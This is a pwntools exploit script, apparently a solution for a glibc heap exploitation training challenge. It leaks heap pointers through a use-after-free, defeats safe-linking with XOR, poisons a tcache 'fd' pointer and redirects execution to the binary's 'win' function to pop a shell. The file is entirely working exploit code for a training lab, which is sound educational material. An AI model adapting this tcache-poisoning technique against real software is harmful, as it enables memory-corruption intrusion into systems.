#!/usr/bin/env python3
# https://github.com/SecurityInnovation/glibc_heap_exploitation_training/blob/master/modules/fd_poison/challenge1/start.py
from pwn import * 
from time import sleep


elf_name = "./happy"

elf = ELF(elf_name)

	
# p = gdb.debug([elf.path]) 
p = process(elf_name) 


def create_kid(name, age):
	print("[*] Create a chunk")
	p.sendlineafter(b">", b"1") 

	# Send the name
	p.sendlineafter(b":", name.encode())

	# Send the age
	p.sendlineafter(b":", str(age).encode())
	return 

def edit_kid(index, name, age):
	p.sendlineafter(b">", b"4" )
	
	# Send the index 
	p.sendlineafter(b":", str(index).encode())
	# Send the name
	p.sendlineafter(b":", str(name).encode())
	# Send the age
	p.sendlineafter(b":", str(age).encode())
	return 

def free_kid(index):
	print(f"[+] free a chunk, index: {index}")
	p.sendlineafter(b">", b"3") 

	# The index of the kid to free
	p.sendlineafter(b":",str(index).encode())

def view_kid(index): 
	p.sendlineafter(b">", b"2") 

	# Send the index to view
	p.sendlineafter(b":", str(index).encode())

	# Read the name
	p.recvuntil(b":") 
	name = p.recvline()

	# Read the age
	p.recvuntil(b":")  
	age = p.recvline() 
	return name.split(), age.split() 


create_kid("noOne", 0x10) 
create_kid("noOne", 0x10) 
create_kid("noOne", 0x10) # Prevent Consolidation with TopChunk

free_kid(0)
free_kid(1)

n1, a1 = view_kid(0) # fd leak
n2, a2 = view_kid(1) # fd leak
a1 = int(a1[0].decode(), 16)
a2 = int(a2[0].decode(), 16)

chunk0_addr = (a1 ^ a2)
print(f"[+] addr of chunk0 leaked : {hex(chunk0_addr)}")
chunk1_addr = chunk0_addr + 48
print(f"[+] addr of chunk1 calculated : {hex(chunk1_addr)}")
fake_chunk_addr = (chunk1_addr>>12) ^ (chunk0_addr + 32)
edit_kid(1, "xD", fake_chunk_addr)
print("[+] 'fd' field of chunk1 poisoned")

create_kid("test1", 0x10)
create_kid("test2", elf.symbols["win"]) # ret2win

p.sendlineafter(b">", b"2")
p.sendlineafter(b":", b"0")

print("[+] poping shell")
sleep(0.2)
p.interactive()

